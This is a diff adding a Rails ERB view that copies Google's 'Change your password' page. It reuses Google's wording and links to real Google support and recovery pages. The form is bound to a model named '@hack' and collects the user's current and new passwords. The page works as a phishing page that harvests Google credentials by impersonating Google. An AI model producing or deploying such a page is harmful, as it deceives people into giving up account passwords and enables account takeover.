@@ -1,0 +1,45 @@
+
+<ul><table><h3 style="color: red">Change your password</h3>
+
+  <td width="700cm" style="vertical-align: top;">
+    <h5>Choose a strong password and don't reuse it <br><br>for other accounts.
+    <a href="https://support.google.com/accounts/answer/32040?visit_id=1-636231973722864833-269686299&p=pw_dont_reuse&hl=en-GB&rd=1">Find out more</a>
+    <br><br>
+    Changing your password will sign <br><br>you out of all your devices, including your phone.<br><br> You will need to enter your new password on all your devices.  </h5></td>
+
+    <div style="float: right">
+  <ul>
+  <td>
+    <%= bootstrap_form_for(@hack) do |f| %>
+
+
+        <span class="list-group-item" style="width: 10cm;height: 12.5cm;background-color: #EFEFEF" >
+          <br>
+    <div class="field">
+      <%#= f.label :Current_password  %>
+      <%= f.password_field :Current_password, :class=>"form-control" ,:id=>"exampleInputPassword1"%>
+    </div>
+    <div class="field">
+      <a href="https://accounts.google.com/signin/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&ss=1&scc=1&rm=false&osid=1&hl=en-GB">Don't know your password?</a>
+    </div>
+<br>
+
+  <div class="field">
+    <%#= f.label :New_password %>
+    <%= f.password_field :New_password, :class=>"form-control" ,:id=>"exampleInputPassword1"%>
+  </div>
+<br>
+  <div class="field">
+    <%#= f.label :Confirm_new_password %>
+    <%= f.password_field :Confirm_new_password, :class=>"form-control" ,:id=>"exampleInputPassword1" %>
+  </div>
+<br><br>
+  <div class="actions">
+    <%= f.button 'Change Password',class: "btn btn-primary",autocomplete: "off"%>
+    <%= button_tag 'Cancel',class: "btn btn-default",url:'google.com'  %>
+  </div>
+</span>
+<% end %>
+  </td></ul></div>
+</table> </ul>
+
